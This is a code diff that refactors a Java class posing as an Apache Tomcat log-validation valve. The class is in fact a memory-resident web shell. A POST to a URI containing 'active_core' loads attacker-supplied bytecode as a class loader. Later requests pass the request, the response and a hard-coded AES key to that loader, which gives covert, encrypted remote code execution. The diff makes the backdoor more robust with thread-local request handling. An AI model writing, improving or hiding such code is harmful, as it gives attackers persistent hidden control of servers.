@@ -3,54 +3,42 @@ package org.apache.catalina.valves;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.PrintWriter;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
+import javax.servlet.ServletException;
 import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.Response;
 
 public class LogValidationValve extends ValveBase {
 
     private static Object globalLoaderInstance = null;
-    private static String globalAesKey = "[KEY]           ";
+    private static String globalAesKey = "[KEY]            ";
 
-    private static Object cachedResponse = null;
-    private static Object cachedRequestFacade = null;
+    private static final ThreadLocal<Object> currentResponse = new ThreadLocal<>();
+    private static final ThreadLocal<Object> currentRequest = new ThreadLocal<>();
 
     public LogValidationValve() {
         super(true);
     }
 
-    public Object getRequest() {
-        return cachedRequestFacade; 
-    }
-
-    public Object getResponse() {
-        return cachedResponse;
-    }
-
-    public Object getSession() {
-        return this; 
-    }
+    public Object getRequest() { return currentRequest.get(); }
+    public Object getResponse() { return currentResponse.get(); }
+    public Object getSession() { return this; }
 
     public Object getAttribute(String name) {
-        if ("k".equals(name)) {
-            return globalAesKey;
-        }
+        if ("k".equals(name)) { return globalAesKey; }
         return null;
     }
 
     @Override
-    public void invoke(Request request, Response response) throws IOException, javax.servlet.ServletException {
+    public void invoke(Request request, Response response) throws IOException, ServletException {
         if ("POST".equalsIgnoreCase(request.getMethod()) && request.getRequestURI().contains("active_core")) {
+            currentResponse.set(response);
+            currentRequest.set(request.getRequest());
+
             try {
-                cachedResponse = response;
-                cachedRequestFacade = request.getRequest();
                 if (globalLoaderInstance == null) {
                     InputStream is = request.getInputStream();
                     ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                    byte[] buf = new byte[512];
+                    byte[] buf = new byte[1024];
                     int length;
                     while ((length = is.read(buf)) != -1) {
                         bos.write(buf, 0, length);
@@ -73,32 +61,26 @@ public class LogValidationValve extends ValveBase {
                     java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(new Class[]{ClassLoader.class});
                     globalLoaderInstance = constructor.newInstance(new Object[]{parentLoader});
                     
-                    response.getWriter().print("LOADER_INIT_SUCCESS");
-                    response.finishResponse(); 
+                    response.getWriter().write("LOADER_INIT_SUCCESS");
+                    response.getWriter().flush();
                     return;
-                } 
-                else {
-                    try {
-                        Class<?> pulsarClass = globalLoaderInstance.getClass();
-                        java.lang.reflect.Field fKey = null;
-                        try { fKey = pulsarClass.getDeclaredField("KEY"); } catch (Exception ex) { fKey = pulsarClass.getDeclaredField("key"); }
-                        if (fKey != null) {
-                            fKey.setAccessible(true);
-                            fKey.set(null, globalAesKey); 
-                        }
-                    } catch (Exception e) {}
-
+                } else {
                     globalLoaderInstance.getClass().getMethod("equals", new Class[]{Object.class}).invoke(globalLoaderInstance, new Object[]{this});
                     
-                    response.finishResponse(); 
+                    try {
+                        response.flushBuffer();
+                    } catch (Exception ignored) {}
                     return;
                 }
             } catch (Exception ex) {
                 try {
-                    response.getWriter().print("VALVE_CRITICAL_FAULT: " + ex.toString());
+                    response.getWriter().write("VALVE_CRITICAL_FAULT: " + ex.toString());
+                    response.getWriter().flush();
                 } catch (Exception ignored) {}
-                response.finishResponse();
                 return;
+            } finally {
+                currentResponse.remove();
+                currentRequest.remove();
             }
         }
         
